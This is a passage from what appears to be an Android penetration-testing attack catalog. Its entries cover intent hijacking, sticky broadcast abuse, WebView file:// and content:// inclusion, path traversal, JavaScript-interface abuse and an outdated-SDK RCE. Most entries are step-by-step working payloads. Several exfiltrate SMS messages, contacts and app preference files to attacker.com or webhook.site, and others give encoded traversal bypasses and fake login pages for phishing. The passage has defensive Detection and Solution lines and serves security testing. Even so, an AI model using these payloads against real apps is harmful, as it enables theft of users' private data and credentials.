You can view the effect by restarting the app and watching adb logcat to monitor what the receiver does when it receives the injected intent. 9. You can also build a test malicious app to inject this sticky broadcast using code: Intent intent = new Intent("com.example.vulnerableapp.STATUS_UPDATE"); intent.putExtra("status", "admin_mode_enabled"); sendStickyBroadcast(intent);. 10. If the app performs privileged or security-sensitive actions based on this broadcast, the abuse is successful. 11. Try variations like: --es "user" "hacker" or --ei "sync_code" 9999 to test the app’s trust in broadcast data. 12. If the app logs sensitive behavior, syncs to server, or modifies internal states based on the sticky data, you have proven Sticky Broadcast Abuse is exploitable. 13. This abuse can persist — any new component that listens to this broadcast will receive the fake data until the device is rebooted or the sticky broadcast is cleared using removeStickyBroadcast(). 14. Document all results, screenshots, and log output to report or demonstrate the attack.
- **Detection**: Code review + dynamic test using adb sticky broadcasts
- **Solution**: Never use sticky broadcasts in production; if used, apply android:permission; verify intent origin in receiver code and sanitize all inputs
- **Tags**: android, sticky-broadcast, adb, injection, logic-bypass, mobile, beginner, broadcastreceiver

## Implicit Intent Hijack (Component Confusion)

- **Attack Type**: Intent Hijacking / Component Confusion
- **Target**: Android App (APK)
- **Vulnerability**: Implicit Intents sent without specifying trusted component
- **MITRE**: T1410 – Intent Spoofing
- **Impact**: Hijack of legitimate system or app workflow, data theft, phishing UI, spoofed response injection
- **Tools**: Android Studio, jadx-gui, apktool, ADB, Android Emulator, malicious APK (test)
- **Scenario**: Android apps often use implicit intents to request actions like opening a file, sharing content, launching a camera, or downloading data. When an implicit intent is sent, Android looks for the best-matching app component (Activity, Service, etc.) to handle it. If a malicious app registers a matching intent filter, it can intercept or hijack the intent, tricking the system into launching the malicious component instead of the intended one. This is called Component Confusion or Implicit Intent Hijacking, and it can lead to data theft, phishing UI, spoofed responses, or malicious payload injection.
- **Attack Steps**: 1. Install the victim app (target app) that sends implicit intents. You can use a demo app that uses startActivity() or startService() with implicit intent like Intent intent = new Intent("com.example.SEND_MESSAGE"); startActivity(intent);. 2. Use jadx-gui or apktool d app.apk to decompile the app and check where the intent is being created. Look for usages of Intent intent = new Intent("com.example.SEND_MESSAGE"); or intent.setAction("custom.ACTION"). This confirms the app sends an implicit intent with a specific action. 3. Now develop a malicious app or use an existing APK that registers a fake component (Activity/Service) in its AndroidManifest.xml with a matching <intent-filter> for that action. Example: <activity android:name=".FakeReceiverActivity"> <intent-filter> <action android:name="com.example.SEND_MESSAGE"/> <category android:name="android.intent.category.DEFAULT"/> </intent-filter> </activity>. 4. Sign and install this malicious app on the same emulator or device where the victim app is installed. 5. Now launch the victim app and trigger the function that sends the implicit intent. 6. If your malicious app’s Activity or Service is launched instead of the legitimate one, then intent hijacking is successful. You can show a fake screen (e.g., fake login), steal user input, redirect them, or just silently intercept data. 7. In the malicious activity, log received data using: Bundle extras = getIntent().getExtras(); Log.d("Hijack", extras.getString("msg")); — this lets you read any sensitive intent data passed. 8. You can also set intent.setData() or setType() in the malicious filter to match more precisely. Example: <data android:mimeType="text/plain"/>. 9. To increase stealth, make your fake component look identical to the real one, or simply redirect the user back to the real one after logging data. 10. Confirm hijack by checking the Android log: use adb logcat and look for your malicious app’s logs. 11. You can optionally reverse this with adb shell dumpsys activity to check which component handled the intent. If it's your fake one, hijack is proven. 12. Document the action, data, log output, and screen activity. You have now successfully executed Implicit Intent Hijacking (Component Confusion) on a real app setup.
- **Detection**: Static analysis of manifest and code + dynamic test with malicious app intent filter
- **Solution**: Always use explicit intents when launching internal components; validate component origin and use package restrictions; don’t expose sensitive data via unprotected implicit intents
- **Tags**: android, intent-hijack, component-confusion, implicit-intent, phishing, adb, beginner, injection

## Unvalidated file:// URL Loaded from User Input

- **Attack Type**: Local File Inclusion via WebView
- **Target**: Android App (APK)
- **Vulnerability**: WebView loading file:// URLs without validation
- **MITRE**: T1437 – Execution via API
- **Impact**: Sensitive file disclosure, malicious HTML execution, stored XSS, app logic abuse
- **Tools**: Android Studio, ADB, jadx-gui, apktool, Android Emulator or rooted phone
- **Scenario**: Android apps often embed a WebView to load content like help pages, documentation, or URLs based on user input. If the app loads URLs directly from unvalidated user input (like from an intent extra, deep link, or form field) and does not restrict to trusted domains or schemes, an attacker can pass a file:// URI instead of a safe https:// one. This leads the WebView to load local files from the app or system — a Local File Inclusion (LFI). This is known as WebView LFI via file://, and can expose sensitive files like cookies, source code, or cached data.
- **Attack Steps**: 1. First install a vulnerable Android app that uses a WebView and loads a URL from user input. This could be from an intent extra, deep link, or form input. You can build a sample app or use known vulnerable ones. Example vulnerable code: webView.loadUrl(getIntent().getStringExtra("url"));. 2. Decompile the app using jadx-gui or apktool d app.apk and search for webView.loadUrl(...). Confirm whether it uses data from Intent, Bundle, or EditText without validation. 3. Launch the app via ADB using a malicious intent: adb shell am start -n com.example.vulnerableapp/.WebViewActivity --es url file:///sdcard/Download/secret.html. This injects a file:// path as the URL. 4. If the WebView loads the content of that file (e.g., shows contents of secret.html), the vulnerability is confirmed. You can also try: file:///proc/self/cmdline, file:///data/data/com.example.vulnerableapp/shared_prefs/config.xml, or file:///sdcard/.hiddenfile. 5. Place a test file in the emulator using adb push test.html /sdcard/Download/test.html and load it with: adb shell am start -n com.example.vulnerableapp/.WebViewActivity --es url file:///sdcard/Download/test.html. This proves you can control content loaded inside WebView. 6. If the WebView executes JavaScript (webView.getSettings().setJavaScriptEnabled(true)), try malicious payloads like: <script>alert('XSS via LFI')</script> in your HTML file. This simulates real-world attacks where an attacker might trick a user into opening such content. 7. Also test URL encoded paths: file://%2Fsdcard%2FDownload%2Fsecret.html to bypass naive filters. 8. If the WebView is enabled with local file access (setAllowFileAccess(true)), the attacker may chain with path traversal or even file:// → content:// bridges. 9. To automate this, write a malicious app that sends the same intent with code: Intent i = new Intent(); i.setComponent(new ComponentName("com.example.vulnerableapp", "com.example.vulnerableapp.WebViewActivity")); i.putExtra("url", "file:///sdcard/Download/malicious.html"); startActivity(i);. 10. Observe the result — if sensitive files are loaded, WebView shows them without errors, or user sees the injected content, the LFI is successful. 11. Document screenshots, logs, and code for reporting. You have now performed a full file:// LFI attack via unvalidated WebView input, a high-severity real-world bug often found in banking, note-taking, and enterprise Android apps.
- **Detection**: Manifest and Java code review + runtime test with file:// URI injection
- **Solution**: Always sanitize and validate URL input; block file://, content://, and allow only HTTPS using URL schemes + custom WebViewClient validation
- **Tags**: android, file-lfi, file-url, webview, local-file-access, insecure-webview, adb, injection

## JavaScript-Enabled LFI + Local File JS Execution

- **Attack Type**: Local File Inclusion + Script Injection via WebView
- **Target**: Android App (APK)
- **Vulnerability**: Loading file:// URI from untrusted source + JS enabled
- **MITRE**: T1437 – Execution via API
- **Impact**: Full JavaScript execution in app context, phishing UI, stolen cookies, data exfiltration
- **Tools**: Android Studio, ADB, jadx-gui, apktool, Android Emulator or rooted device, Notepad
- **Scenario**: Many Android apps embed a WebView to show help content, user-submitted links, or files. If the app allows user input to control the URL or file path loaded in WebView without validating the source, and has JavaScript enabled, an attacker can load a malicious local file using the file:// scheme. If that file contains JavaScript, it will be executed in the app’s context, which may lead to XSS (cross-site scripting), data theft, cookie access, or visual phishing. This attack is real and widespread in apps that call webView.loadUrl(...) using untrusted data and set webView.getSettings().setJavaScriptEnabled(true).
- **Attack Steps**: 1. First, install a test or real app that uses WebView and loads URLs using unvalidated user input. You can create a test app where WebView loads a URL from an Intent extra like: webView.loadUrl(getIntent().getStringExtra("url"));. Make sure webView.getSettings().setJavaScriptEnabled(true); is enabled in the app. 2. Decompile the app using jadx-gui or apktool d app.apk. Check for unprotected usage of webView.loadUrl(...) and ensure the URL comes from external input (like Intent, EditText, etc.). 3. Confirm JavaScript is enabled by locating webView.getSettings().setJavaScriptEnabled(true) in the source code. This step is important because LFI without JS is less dangerous. 4. Create a malicious HTML file on your desktop with this content: <html><body><script>alert('XSS Executed!')</script></body></html> and save it as xss.html. 5. Push this file into the emulator or device’s SD card using: adb push xss.html /sdcard/Download/xss.html. 6. Now simulate an attack by injecting a file:// URL to that HTML using ADB: adb shell am start -n com.example.vulnerableapp/.WebViewActivity --es url file:///sdcard/Download/xss.html. 7. When the app loads, the WebView will fetch and render your local file, and since JS is enabled, the alert popup will appear — confirming JS execution. 8. Try a more advanced payload in your HTML like: <script>fetch('https://attacker.com?cookie='+document.cookie);</script> and observe requests using a server like ngrok or Burp Suite. This simulates real-world data exfiltration. 9. You can also try loading internal files containing JavaScript like file:///data/data/com.example.vulnerableapp/files/savedreport.js (if they exist and contain any eval-safe JS). 10. If the WebView runs this JS without warning or restriction, then the attack is confirmed. 11. You can also chain this LFI with phishing: create a full fake login page in file:///sdcard/Download/fake.html with JS that collects user input and sends it to your server. 12. Send this file to the victim via file sharing apps, or use a malicious app to send the intent programmatically: Intent i = new Intent(); i.setComponent(new ComponentName("com.example.vulnerableapp", "com.example.vulnerableapp.WebViewActivity")); i.putExtra("url", "file:///sdcard/Download/fake.html"); startActivity(i);. 13. Use adb logcat to watch if internal JS gets executed or if requests are sent out. 14. You have now successfully performed a JavaScript-Enabled LFI attack on an Android WebView, one of the most dangerous flaws in mobile Web apps. This combines two powerful issues: LFI + JS Execution.
- **Detection**: Code analysis (webView.loadUrl(...)) + runtime test with file:// and JS payload
- **Solution**: Never allow file:// URLs from user input, disable setJavaScriptEnabled(true), and restrict URLs via WebViewClient using URL whitelisting
- **Tags**: android, webview, javascript-lfi, file-uri, local-file-js, xss, adb, injection, mobile

## Accessing content:// URIs via WebView (LFI using Content Providers)

- **Attack Type**: Local File Inclusion via WebView + Content URI Access
- **Target**: Android App (APK)
- **Vulnerability**: Unvalidated content:// URI loading in WebView + exposed Content Providers
- **MITRE**: T1437 – Execution via API / T1409 – Access Sensitive Data via Local IPC
- **Impact**: Read sensitive data (SMS, contacts, local DBs), app crash, user tracking, data exfiltration
- **Tools**: Android Studio, ADB, JADX, apktool, Emulator or Rooted Android, Web browser, Notepad
- **Scenario**: Android uses content:// URIs to access data from Content Providers, which are used to share files, messages, databases, or media between apps. Normally, only specific apps have permission to access a given content:// URI. But if an app's WebView accepts and loads unvalidated URIs from user input, and if JavaScript is enabled, an attacker can load a content:// URI and attempt to steal data or trigger actions in other apps. Some apps expose exported or insecure content providers (android:exported="true") that can be accessed directly using URIs like content://com.example.app.provider/userdata. If the vulnerable app does not block content:// scheme, this becomes a Local File Inclusion attack via WebView that exposes sensitive internal or inter-app data.
- **Attack Steps**: 1. Install a test app or known vulnerable app that includes a WebView and uses webView.loadUrl() with user-controlled input (via Intent, Deep Link, EditText, etc.). Confirm the app enables JavaScript with webView.getSettings().setJavaScriptEnabled(true) and doesn't restrict URI schemes. 2. Decompile the app with jadx-gui or apktool d app.apk and check if loadUrl() receives input from outside and no filters are applied (e.g., startsWith("http")). 3. Identify a known or test content:// URI to exploit. You can test common targets like: content://com.android.contacts/contacts, content://sms/inbox, or use a vulnerable exported provider from another app like: content://com.vulnerable.app.provider/private_logs. 4. Push a simple HTML file with JavaScript on the emulator: adb push view.html /sdcard/Download/view.html with contents: <html><body><iframe src="content://sms/inbox"></iframe></body></html>. 5. Now send an intent to the vulnerable app: adb shell am start -n com.example.vulnerableapp/.MainActivity --es url file:///sdcard/Download/view.html. The WebView will load the file containing the iframe, which requests the content:// URI. 6. If the app has not blocked WebView from accessing content URIs, and if the URI is accessible, you will see the raw output of the content provider loaded in the WebView. 7. You can also directly inject the content URI into the app’s WebView using: adb shell am start -n com.example.vulnerableapp/.MainActivity --es url content://com.android.contacts/contacts. 8. If WebView shows contact names, numbers, or SMS messages, the attack is confirmed. 9. Use adb logcat to monitor app logs and look for any stack traces or file loading attempts — if the app crashes or reveals full content, it's exploitable. 10. Now test advanced content provider URIs (known public ones or from exported providers): for example, install an intentionally vulnerable app with an exported provider and try content://com.vuln.provider/files/private.json. 11. To test this via malicious app: build an APK that sends the same intent with putExtra("url", "content://...") to the vulnerable WebView activity. 12. For further exploitation, chain this attack with JavaScript. Push a file with <script>fetch("content://sms/inbox").then(res => res.text()).then(txt => location.href='https://attacker.com/?data='+btoa(txt))</script> and trigger it using file:// scheme. 13. This would send SMS or contact content directly to your server. Confirm receipt using ngrok, Burp Suite, or webhook.site. 14. If successful, you’ve performed a real, working WebView LFI via content:// access, combining Content Provider abuse + unvalidated WebView URI loading. This is a serious vulnerability in many apps that use WebView without proper input sanitation.
- **Detection**: Code inspection (webView.loadUrl(...)) + runtime test with content:// injections
- **Solution**: Always block content:// and file:// in WebView inputs, validate URLs using a whitelist, use WebViewClient.shouldOverrideUrlLoading() and restrict URI schemes
- **Tags**: android, webview, content-uri, lfi, local-file-access, injection, adb, mobile-security, beginner

## Reading App-Private Files via Path Traversal in WebView

- **Attack Type**: Local File Inclusion (LFI) + Path Traversal
- **Target**: Android App (APK)
- **Vulnerability**: WebView loading file:// URLs with unsanitized user-controlled file paths
- **MITRE**: T1410 – Exploit via Path Traversal
- **Impact**: Steal internal app files, settings, tokens, logs, databases, bypass sandboxing
- **Tools**: Android Studio, ADB, jadx-gui, apktool, Emulator or Rooted Phone, Notepad
- **Scenario**: Some Android apps allow users to specify file paths or file names (e.g., for opening help docs, loading reports, exporting files, etc.) via WebView or file-based features. If the app does not sanitize the input path and passes it directly to WebView or a file loader, an attacker can perform a path traversal using sequences like ../ to move out of the allowed folder and access private files in the app’s internal storage. If the app also allows file:// URLs to be loaded in WebView, and JavaScript is enabled, this attack can even lead to JS-based data theft. This vulnerability is often overlooked because apps assume users won't manipulate file paths, but in reality, WebView combined with file:// + ../ can read shared_prefs, SQLite DBs, cached files, etc.
- **Attack Steps**: 1. First, install the target app (vulnerable app) that uses WebView and allows user-controlled input to form or load file paths. Example code in the app could be: webView.loadUrl("file:///sdcard/docs/" + getIntent().getStringExtra("file"));. This directly appends user input to a file path. 2. Decompile the APK using jadx-gui or apktool d app.apk and search for loadUrl calls inside Activities or Fragments. Look for string concatenation like "file://" + userInput or similar. 3. Confirm whether JavaScript is enabled in the WebView with webView.getSettings().setJavaScriptEnabled(true). 4. Now create a malicious intent to exploit path traversal using ../ — for example: adb shell am start -n com.vuln.app/.WebViewActivity --es file ../../../../data/data/com.vuln.app/shared_prefs/config.xml. This attempts to escape /sdcard/docs/ and access internal app-private files via WebView. 5. If the WebView loads the XML file (typically containing user settings, API keys, etc.), it will render as plain text in the app’s WebView — confirming successful LFI via path traversal. 6. For testing, you can also try reading other sensitive files like: ../../../../data/data/com.vuln.app/databases/user.db or ../../../../proc/self/cmdline. 7. Push a local HTML file with JavaScript to observe advanced results: Create a file named stealer.html with <script>fetch("file:///data/data/com.vuln.app/shared_prefs/config.xml").then(r=>r.text()).then(t=>location='https://attacker.com/?d='+btoa(t));</script> and push it using adb push stealer.html /sdcard/Download/stealer.html. 8. Then run: adb shell am start -n com.vuln.app/.WebViewActivity --es file ../../../../sdcard/Download/stealer.html. This will trigger the JS to fetch the internal file and send it to your attacker-controlled server. 9. Monitor your server (using ngrok or webhook.site) to confirm if the file content is exfiltrated. 10. This confirms successful path traversal LFI using file:// + WebView. 11. Advanced: If the app blocks ../, try double encoding: %2e%2e/ or %252e%252e/ in the file path. For example: --es file %2e%2e%2f%2e%2e%2fdata%2fdata%2fcom.vuln.app%2fshared_prefs%2fconfig.xml. This can bypass basic filters. 12. Document all successful reads, screenshots, and WebView behaviors. You have now successfully carried out a Local File Inclusion via Path Traversal attack inside WebView — a real-world, high-impact mobile security issue.
- **Detection**: Code review + runtime test using file:// path with ../ traversal injection
- **Solution**: Always sanitize file paths, reject ../, enforce path restrictions, never use user input in WebView loadUrl without strict validation, and block file:// URIs entirely
- **Tags**: android, webview, path-traversal, lfi, file-url, local-file-access, js-execution, adb, beginner, mobile

## Intent-Based File Inclusion via Deep Link

- **Attack Type**: Local File Inclusion (LFI) via Deep Link + WebView
- **Target**: Android App (APK)
- **Vulnerability**: WebView + Deep Link Intent loading unsanitized file paths
- **MITRE**: T1410 – Exploitation via Path Traversal
- **Impact**: Read app-private files, configuration leakage, stored credentials, or token theft
- **Tools**: Android Studio, ADB, Emulator or Rooted Device, JADX, Chrome browser (or URI launcher), Notepad
- **Scenario**: Many Android apps register deep links (special links like appname://open) to allow launching specific features directly via a browser or intent. These deep links often contain parameters (e.g., appname://open?file=report.html). If the app’s WebView or file loader takes these parameters and directly loads them without sanitizing, it’s possible to inject a file:// path or use ../ traversal to read sensitive internal or external files. This becomes an LFI (Local File Inclusion) triggered through an intent or a deep link, allowing attackers to include and read arbitrary files inside the WebView — even without touching the app's UI. This attack is extremely common in apps that support file preview, report download, or offline content rendering through URLs or filenames from deep links.
- **Attack Steps**: 1. Find or install an app that supports deep linking and has a WebView component. The app must declare <intent-filter> with android:scheme="appname" in its manifest. Use jadx-gui or apktool d app.apk to analyze the app and locate deep link handlers. Look for Activities that receive file or URL parameters via Intent or URI, such as: Uri uri = getIntent().getData(); String file = uri.getQueryParameter("file"); webView.loadUrl("file:///sdcard/docs/" + file);. This pattern is vulnerable. 2. Confirm WebView JavaScript is enabled using: webView.getSettings().setJavaScriptEnabled(true). This increases risk. 3. Test the deep link on the emulator. In Chrome or any browser on emulator/device, open a link like: appname://open?file=../../../../data/data/com.vuln.app/shared_prefs/config.xml. 4. If the app opens and the WebView loads the internal file, it confirms the vulnerability. This shows path traversal via deep link. 5. Alternatively, run it from ADB: adb shell am start -a android.intent.action.VIEW -d "appname://open?file=../../../../data/data/com.vuln.app/shared_prefs/config.xml" com.vuln.app. This triggers the deep link directly using intent. 6. The file (like config.xml) will render in the app’s WebView if vulnerable. Try other targets like: ../../../../sdcard/Download/x.html, ../../../proc/self/cmdline, or any existing internal file. 7. Now push a local HTML file with a script using: adb push steal.html /sdcard/Download/steal.html with content like <script>fetch('file:///data/data/com.vuln.app/shared_prefs/config.xml').then(r=>r.text()).then(t=>location='https://attacker.com?x='+btoa(t));</script>. Then open: appname://open?file=../../../../sdcard/Download/steal.html. 8. The WebView will load your attacker-controlled file and execute the JavaScript, which exfiltrates sensitive app data. Capture it using webhook.site, ngrok, or Burp Collaborator. 9. Some apps block ../. Bypass using encoded traversal: %2e%2e%2f%2e%2e%2f, or ..%252f..%252f. Example: appname://open?file=..%252f..%252f..%252fdata%252fdata%252fcom.vuln.app%252fshared_prefs%252fuser.xml. 10. You have now exploited a real-world Intent-Based LFI via Deep Link in WebView, causing internal file disclosure without any user interaction — purely via a crafted URI. 11. Advanced: Write a small malicious app that sends the crafted Intent using: Intent i = new Intent(Intent.ACTION_VIEW); i.setData(Uri.parse("appname://open?file=../../../../data/data/...")); startActivity(i); — simulating full exploitation vector.
- **Detection**: Manifest + Java code review + browser/intent test with deep link parameter injection
- **Solution**: Sanitize all deep link parameters; reject traversal (../); allow only whitelisted filenames or URLs; avoid loading file:// paths from external input; use URL schemes validation (http/https only)
- **Tags**: android, lfi, deeplink, webview, file-url, path-traversal, intent-injection, mobile-security

## Using JavaScript Interface to Exfiltrate Local Files

- **Attack Type**: Local File Inclusion (LFI) + JavaScriptInterface Abuse
- **Target**: Android App (APK)
- **Vulnerability**: WebView loading file:// content + Exposed addJavascriptInterface()
- **MITRE**: T1437 – Code Execution via JS Interface
- **Impact**: Internal file read, exfiltration, possible RCE or malicious actions from JS
- **Tools**: Android Studio, ADB, jadx-gui, apktool, Notepad, Emulator or rooted device, webhook.site or ngrok
- **Scenario**: Android WebView allows apps to expose Java objects into JavaScript using addJavascriptInterface(). If the app uses this interface to expose sensitive functions (like file access, logging, or intents) to any webpage loaded inside the WebView — and if the app also loads untrusted or attacker-controlled HTML via file:// or deep links — the attacker can use JavaScript to call those functions. When combined with LFI (such as loading local files via file://), the attacker can inject a malicious HTML that uses the JavaScript interface to exfiltrate internal app files, such as shared preferences, user info, or DB contents. This is highly dangerous, especially when apps do not restrict WebView content sources or JS interface binding.
- **Attack Steps**: 1. Install a vulnerable test app or target app that uses WebView and contains a line like webView.addJavascriptInterface(new MyJSBridge(), "Android") in any Activity. This exposes native methods to JavaScript inside WebView. Use JADX or apktool to decompile the APK and search for addJavascriptInterface(). Confirm that JavaScript is enabled in WebView using webView.getSettings().setJavaScriptEnabled(true). 2. Inspect the interface class (e.g., MyJSBridge) and identify any method annotated with @JavascriptInterface, such as public void sendFile(String content) or public void uploadData(String payload). These are callable via JavaScript. 3. Check if the app loads local files from user input using webView.loadUrl(...) with file:// or content://. If yes, and you can control that path through an intent or deep link, then it is exploitable. 4. On your PC, create a malicious HTML payload named exploit.html with the following content: <html><body><script>fetch('file:///data/data/com.vuln.app/shared_prefs/config.xml').then(r=>r.text()).then(t=>Android.sendFile(t));</script></body></html>. This script reads an internal file and sends it to the exposed Android method. 5. Push the HTML to your emulator using: adb push exploit.html /sdcard/Download/exploit.html. 6. Launch the vulnerable activity using: adb shell am start -n com.vuln.app/.MainActivity --es url file:///sdcard/Download/exploit.html. This causes the app to load the malicious HTML. 7. When WebView renders the file, the JavaScript will fetch internal data from file:// and send it to the Java interface, e.g., Android.sendFile(...). 8. If the interface logs it, stores it, or forwards it to an external server, the attack is successful. For better proof, edit your malicious HTML to send the data over network: <script>fetch('file:///data/data/com.vuln.app/shared_prefs/config.xml').then(r=>r.text()).then(t=>{let i=new Image(); i.src='https://webhook.site/your-id?data='+btoa(t);});</script>. 9. Replace webhook.site/your-id with your real webhook URL. Push again using adb push exploit2.html /sdcard/Download/exploit2.html. Then launch it the same way. 10. Open your webhook dashboard and verify — if you see the config data, the attack worked. 11. You can also try chaining the JS interface to launch activities, send SMS, or write files if methods like sendSMS(String), openURL(String) exist in the bound class. 12. Congratulations — you have now successfully exploited a real-world LFI using JavaScriptInterface to exfiltrate internal files via file:// and WebView. This technique is deadly when apps expose unsafe methods and load untrusted HTML.
- **Detection**: Code audit for addJavascriptInterface() and WebView behavior + runtime HTML injection
- **Solution**: Never expose JS interface methods to untrusted web content; use @TargetApi(17) and checkOrigin() manually or avoid addJavascriptInterface() entirely; block file:// URLs
- **Tags**: android, webview, lfi, jsinterface, jsbridge, file-url, javascript, adb, mobile-security, beginner

## LFI via Download Manager or WebView File Chooser

- **Attack Type**: Local File Inclusion (LFI) via File Picker + WebView
- **Target**: Android App (APK)
- **Vulnerability**: Unsanitized file loading from file picker or download manager into WebView
- **MITRE**: T1437 – Execute via Trusted Path / T1410 – File Inclusion via User-Controlled Input
- **Impact**: Full internal file access, config leaks, credential theft, sandbox escape
- **Tools**: Android Studio, ADB, jadx-gui, Emulator/Rooted Device, Notepad, Burp Suite, webhook.site
- **Scenario**: Some Android apps allow users to download files from a URL using the system DownloadManager, or allow them to select files using WebView's file input (<input type="file">). If the app loads or previews the selected file via WebView or directly executes loadUrl() or loadData() with file:// path, and does not restrict or sanitize the selected file path, a user can abuse the file picker or downloaded path to load sensitive local files like app-private shared_prefs, SQLite DBs, or even files from /proc/. This becomes an LFI attack that bypasses user interaction and can even leak internal app files if JavaScript is enabled.
- **Attack Steps**: 1. Install or create a test app that includes a file picker (via <input type="file">) or a file download feature using Android's DownloadManager. You can find this by searching in the APK for DownloadManager.Request(...) or <input type="file"> elements inside WebView content. 2. Use jadx-gui or apktool d app.apk to decompile and check how file selection is handled. Many apps allow selected file paths to be passed to WebView using loadUrl("file://" + path) or webView.loadData(...). 3. Also check if WebView has JavaScript enabled (webView.getSettings().setJavaScriptEnabled(true)), which allows file exfiltration. 4. Open the app and navigate to the file picker or file download UI. For file picker, upload a malicious HTML file via file chooser that contains: <script>fetch('file:///data/data/com.vuln.app/shared_prefs/config.xml').then(r=>r.text()).then(t=>location='https://webhook.site/your-id?d='+btoa(t));</script>. Save this file as stealer.html. 5. Push it using ADB: adb push stealer.html /sdcard/Download/stealer.html. Then, select this file via the app’s file picker (if available). 6. If the app reads and renders the file in WebView directly (without sanitization), the JavaScript inside it will execute, read the internal file, and send it to your webhook. 7. Monitor webhook.site or ngrok to confirm if the data is sent — this confirms LFI via file picker. 8. Now test the DownloadManager route. Apps that download a file via URL and load it in WebView are even more vulnerable. Inside the app, find a place where you can enter a URL to download or click a button to fetch a file. Provide this payload URL: https://attacker.com/stealer.html (use same JS as above). 9. Host your malicious stealer.html on a web server or use ngrok or python3 -m http.server on your PC. When the app downloads it using DownloadManager, it gets stored at /storage/emulated/0/Download/stealer.html. 10. If the app loads this file in WebView using something like webView.loadUrl("file://" + downloadedFilePath), the malicious JavaScript will be executed from inside the app context. It can then read internal file paths like file:///data/data/com.vuln.app/databases/user.db. 11. As an attacker, try chaining this by modifying your hosted file: <script>fetch('file:///data/data/com.vuln.app/databases/user.db').then(r=>r.blob()).then(b=>{ let reader = new FileReader(); reader.onload=function(){location='https://webhook.site/your-id?data='+btoa(reader.result)}; reader.readAsText(b); });</script> 12. Repeat the process and wait for data to show up in your webhook. If it does, the LFI via download manager path is confirmed. 13. This attack works because the app implicitly trusts file inputs and downloaded file paths, and directly loads them using file:// scheme. Combined with enabled JS, this creates a powerful LFI + JS execution vector.
- **Detection**: Inspect APK + test file uploads and download paths + load file:// in WebView
- **Solution**: Never load file:// paths from user input; disable file access in WebView (setAllowFileAccess(false)), block JavaScript, or validate MIME/file type strictly
- **Tags**: android, webview, file-url, downloadmanager, file-picker, lfi, file-inclusion, javascript, mobile-security, beginner

## Remote Code Execution via Known SDK Vulnerability

- **Attack Type**: RCE via Outdated Third-Party SDK
- **Target**: Android App (APK)
- **Vulnerability**: Insecure outdated SDK with vulnerable JavaScript interface or input handling
- **MITRE**: T1437 – Code Execution via Third-Party Component
- **Impact**: Full device compromise, app data theft, code execution, session hijacking
- **Tools**: Android Studio, APKTool, JADX, Burp Suite, Metasploit (optional), Browser, ADB, Emulator or Device, CVE Database (e.g., cvedetails.com)
- **Scenario**: Many Android applications use third-party SDKs (for ads, analytics, social login, etc.) that come as .aar or .jar files. If an app includes an outdated version of an SDK with known vulnerabilities, attackers can exploit those flaws to achieve Remote Code Execution (RCE), especially when the SDK exposes JavaScript bridges, insecure web content loading, or insecure file parsing. A well-known real-world example is the Cordova Android Plugin Vulnerability (CVE-2017-3160), which allowed JavaScript code running in WebView to execute arbitrary Java code via an insecure addJavascriptInterface() in an outdated Cordova WebView plugin.
- **Attack Steps**: 1. Identify a target mobile application suspected to use an outdated SDK. For this demo, we’ll use an app that uses an outdated Cordova WebView plugin vulnerable to CVE-2017-3160. 2. Decompile the APK using apktool d target.apk or open it in jadx-gui. Search for addJavascriptInterface() and check if it exposes any class like CordovaBridge, GapBridge, or similar. Look for: webView.addJavascriptInterface(new CordovaBridge(), "cordova"). 3. Check the WebView settings in the same class. Ensure JavaScript is enabled using: webView.getSettings().setJavaScriptEnabled(true) — this is necessary for the exploit. 4. Now check if the app loads content from untrusted sources — such as external URLs or files on SD card — using webView.loadUrl(...) or loadDataWithBaseURL(...). If this is present and not validated, it’s exploitable. 5. On your computer, create a malicious HTML payload (e.g., exploit.html) with the following JavaScript: <script>cordova.exec("alert('RCE')", "", "", "", "");</script>. In outdated Cordova SDKs, this triggers the native method exposed insecurely via the JS interface. 6. Push this file to the emulator: adb push exploit.html /sdcard/Download/exploit.html. 7. Open this file using a browser intent, deep link, or any file loader in the app. If the app loads it in WebView (via file://), the JavaScript will be executed and trigger the exposed Java method. 8. In older SDK versions, it’s possible to chain this further to execute file read, code injection, or even command execution (via native modules or reflective invocation). 9. For advanced exploitation, use Metasploit’s android/webview_addjavascriptinterface module. Start Metasploit, run: use exploit/multi/browser/webview_addjavascriptinterface, set your payload, and host it. Send the URL to the app via any input or log injection method. 10. If the app loads it in WebView, you will get a remote session (if supported by the vulnerable SDK). 11. Alternatively, intercept a request in Burp and inject a payload via parameters that the SDK loads into WebView. 12. Watch for the exploit to trigger. If the SDK is vulnerable, you will see the payload execute — possibly showing alert boxes, reading internal files, or connecting to your server. 13. Confirm the SDK version by checking the build.gradle, .aar filename, or AndroidManifest.xml meta-data tags. Search online (e.g., cordova CVE) and verify if that version is known to be vulnerable. 14. Congratulations — you’ve confirmed a real-world RCE through an outdated SDK embedded in the target app.
- **Detection**: Static code analysis for SDK usage + dynamic test with JS payload in WebView
- **Solution**: Update all SDKs regularly; check CVE database; avoid using WebView in SDKs; apply sandboxing; avoid addJavascriptInterface() unless absolutely needed
- **Tags**: android, sdk, rce, outdated-library, javascriptinterface, cordova, cve, mitre, mobile, beginner

## Man-in-the-Middle via Outdated OpenSSL / TLS

- **Attack Type**: Network-based Attack (MiTM)
- **Target**: Mobile Apps (Android/iOS)
- **Vulnerability**: Outdated SSL/TLS Library (OpenSSL)
- **MITRE**: T1636.002 (Network Sniffing - TLS Downgrade)
- **Impact**: Data Theft, Credential Exposure, Session Hijack
- **Tools**: Wireshark, Bettercap, Burp Suite, Kali Linux, OpenSSL test server, Android emulator, mitmproxy
- **Scenario**: A mobile application uses outdated OpenSSL/TLS libraries that lack support for secure protocols or have known vulnerabilities. This allows an attacker on the same network (e.g., public Wi-Fi) to intercept, decrypt, and possibly modify sensitive user data such as login credentials or API keys during transmission, even if the app claims to use HTTPS.
